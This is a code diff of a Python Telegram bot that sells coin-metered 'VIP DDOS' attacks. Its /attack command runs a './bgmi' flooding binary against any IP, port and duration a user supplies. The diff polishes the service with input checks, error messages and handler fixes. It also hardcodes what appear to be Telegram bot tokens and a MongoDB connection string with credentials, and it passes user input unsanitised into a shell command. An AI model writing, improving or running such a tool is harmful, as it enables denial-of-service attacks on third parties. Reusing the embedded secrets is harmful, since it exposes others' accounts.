@@ -1,42 +1,49 @@
 import asyncio
+import os
+import sys
 from datetime import datetime, timedelta
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from motor.motor_asyncio import AsyncIOMotorClient
 
-bot_start_time = datetime.now()
-attack_in_progress = False
-current_attack = None  # Store details of the current attack
-attack_history = []  # Store attack logs
-
-TELEGRAM_BOT_TOKEN = '8647083732:AAFW_vOgopnSl8dZnwui2uRa6ehHGJvHpZY'  # Replace with your bot token
-ADMIN_USER_ID = 8003600588
+# --- Configuration ---
+TELEGRAM_BOT_TOKEN = '8058370192:AAErXXSNYFnjjQrNNTKVV37dpuHX1r35a3U'  # REPLACE WITH YOUR TOKEN
+ADMIN_USER_ID = 1240179115
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "legxninja"
 COLLECTION_NAME = "users"
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
-COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
+ATTACK_TIME_LIMIT = 240
+COINS_REQUIRED_PER_ATTACK = 5
 
-# MongoDB setup
+# --- Global Variables ---
+bot_start_time = datetime.now()
+attack_in_progress = False
+attack_end_time = None  # Fixed: Define this globally
+
+# --- MongoDB Setup ---
+# Fix for Windows asyncio runtime policy if applicable
+if sys.platform == 'win32':
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
 mongo_client = AsyncIOMotorClient(MONGO_URI)
 db = mongo_client[DB_NAME]
 users_collection = db[COLLECTION_NAME]
 
+# --- Database Functions ---
 async def get_user(user_id):
-    """Fetch user data from MongoDB."""
     user = await users_collection.find_one({"user_id": user_id})
     if not user:
         return {"user_id": user_id, "coins": 0}
     return user
 
 async def update_user(user_id, coins):
-    """Update user coins in MongoDB."""
     await users_collection.update_one(
         {"user_id": user_id},
         {"$set": {"coins": coins}},
         upsert=True
     )
 
+# --- Command Handlers ---
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
@@ -65,9 +72,13 @@ async def ninja(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /ninja <add|rem> <user_id> <coins>*", parse_mode='Markdown')
         return
 
-    command, target_user_id, coins = args
-    coins = int(coins)
-    target_user_id = int(target_user_id)
+    try:
+        command, target_user_id, coins = args
+        coins = int(coins)
+        target_user_id = int(target_user_id)
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid arguments. User ID and Coins must be numbers.*", parse_mode='Markdown')
+        return
 
     user = await get_user(target_user_id)
 
@@ -79,9 +90,11 @@ async def ninja(update: Update, context: CallbackContext):
         new_balance = max(0, user["coins"] - coins)
         await update_user(target_user_id, new_balance)
         await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid command. Use 'add' or 'rem'.*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
-    global attack_in_progress, attack_end_time, bot_start_time
+    global attack_in_progress, attack_end_time
 
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
@@ -98,12 +111,15 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     if attack_in_progress:
-        remaining_time = (attack_end_time - datetime.now()).total_seconds()
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
-            parse_mode='Markdown'
-        )
+        if attack_end_time:
+            remaining_time = (attack_end_time - datetime.now()).total_seconds()
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
+                parse_mode='Markdown'
+            )
+        else:
+            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already in progress.*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
@@ -119,17 +135,20 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     ip, port, duration = args
-    port = int(port)
-    duration = int(duration)
+    
+    try:
+        port = int(port)
+        duration = int(duration)
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Port and Duration must be numbers!*", parse_mode='Markdown')
+        return
 
     # Check for restricted ports
     restricted_ports = [17500, 20000, 20001, 20002]
     if port in restricted_ports or (100 <= port <= 999):
         await context.bot.send_message(
             chat_id=chat_id,
-            text=(
-                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*"
-            ),
+            text="*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*",
             parse_mode='Markdown'
         )
         return
@@ -151,6 +170,7 @@ async def attack(update: Update, context: CallbackContext):
 
     attack_in_progress = True
     attack_end_time = datetime.now() + timedelta(seconds=duration)
+    
     await context.bot.send_message(
         chat_id=chat_id,
         text=(
@@ -169,9 +189,9 @@ async def attack(update: Update, context: CallbackContext):
 
 async def run_attack(chat_id, ip, port, duration, context):
     global attack_in_progress, attack_end_time
-    attack_in_progress = True
-
+    
     try:
+        # WARNING: Ensure './bgmi' binary exists in the same directory as this script
         command = f"./bgmi {ip} {port} {duration} {13} {600}"
         process = await asyncio.create_subprocess_shell(
             command,
@@ -227,7 +247,7 @@ async def myinfo(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def help(update: Update, context: CallbackContext):
+async def help_command(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*🛠️ @NINJAGAMEROP VIP DDOS Bot Help Menu 🛠️*\n\n"
@@ -238,28 +258,21 @@ async def help(update: Update, context: CallbackContext):
         "   - *Example: /attack 192.168.1.1 20876 240*\n"
         "   - *📝 Note: Duration 240 seconds se zyada nahi ho sakta.*\n\n"
         "2️⃣ *💳 /myinfo*\n"
-        "   - *Apne account ka status aur coins check karne ke liye.*\n"
-        "   - *Example: Tumhare balance aur approval status ka pura details milega.*\n\n"
+        "   - *Apne account ka status aur coins check karne ke liye.*\n\n"
         "3️⃣ *🔧 /uptime*\n"
-        "   - *Bot ka uptime check karo aur dekho bot kitne der se chal raha hai.*\n\n"
+        "   - *Bot ka uptime check karo.*\n\n"
         "4️⃣ *👤 /users*\n"
-        "   - *Kitne users is bot per added hai dekh lijiye sir ji ADMIN.*\n\n"
-        "4️⃣ *👤 /remove*\n"
-        "   - *users ko bot se nikalna hai ADMIN ji.*\n\n"
-        "5️⃣ *❓ /help*\n"
-        "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
-        "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
-        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
-        "- *Agar koi dikkat aaye toh admin ko contact karo: @NINJAGAMEROP*\n\n"
-        "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
+        "   - *Kitne users is bot per added hai (Admin Only).*\n\n"
+        "5️⃣ *❌ /remove*\n"
+        "   - *Users ko bot se nikalna (Admin Only).*\n\n"
+        "🚨 *Important Tips:* 🚨\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: @NINJAGAMEROP*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 async def users(update: Update, context: CallbackContext):
-    """Display all users and their data, only for the admin."""
     chat_id = update.effective_chat.id
 
-    # Only allow the admin to run this command
     if chat_id != ADMIN_USER_ID:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -268,38 +281,28 @@ async def users(update: Update, context: CallbackContext):
         )
         return
 
-    # Fetch all users from MongoDB
     users_cursor = users_collection.find()
     user_data = await users_cursor.to_list(length=None)
 
     if not user_data:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ No users found in the database.*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No users found in the database.*", parse_mode='Markdown')
         return
 
-    # Send the user data in a formatted message
-    message = "*📊 List of all users in the database: 📊*\n\n"
+    message = "*📊 List of all users: 📊*\n\n"
     for user in user_data:
-        # Check if 'user_id' and 'coins' keys are present
-        user_id = user.get('user_id', 'N/A')  # Default to 'N/A' if 'user_id' is missing
-        coins = user.get('coins', 'N/A')  # Default to 'N/A' if 'coins' is missing
+        user_id = user.get('user_id', 'N/A')
+        coins = user.get('coins', 'N/A')
         message += f"**User ID:** {user_id}  |  **Coins:** {coins}\n"
 
-    # Send the message to the admin
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=message,
-        parse_mode='Markdown'
-    )
+    # Telegram message limit is 4096 chars
+    if len(message) > 4000:
+        message = message[:4000] + "..."
+
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 async def remove_user(update: Update, context: CallbackContext):
-    """Remove a user from the database, only for the admin."""
     chat_id = update.effective_chat.id
 
-    # Only allow the admin to run this command
     if chat_id != ADMIN_USER_ID:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -312,9 +315,12 @@ async def remove_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
         return
 
-    target_user_id = int(context.args[0])
+    try:
+        target_user_id = int(context.args[0])
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ User ID must be a number.*", parse_mode='Markdown')
+        return
 
-    # Remove the user from the database
     result = await users_collection.delete_one({"user_id": target_user_id})
 
     if result.deleted_count > 0:
@@ -323,15 +329,21 @@ async def remove_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} ye chutiya is bot m nhi h malik.*", parse_mode='Markdown')
 
 def main():
+    # Build the Application
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
+    # Add Handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("ninja", ninja))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("myinfo", myinfo))
-    application.add_handler(CommandHandler("help", help))
+    application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("uptime", uptime))
     application.add_handler(CommandHandler("users", users))
-    application.add_handler(CommandHandler("remove", remove_user))  # Add the new /remove command handler
+    application.add_handler(CommandHandler("remove", remove_user))
+
+    # Run the bot
+    print("Bot is starting...")
     application.run_polling()
 
 if __name__ == '__main__':
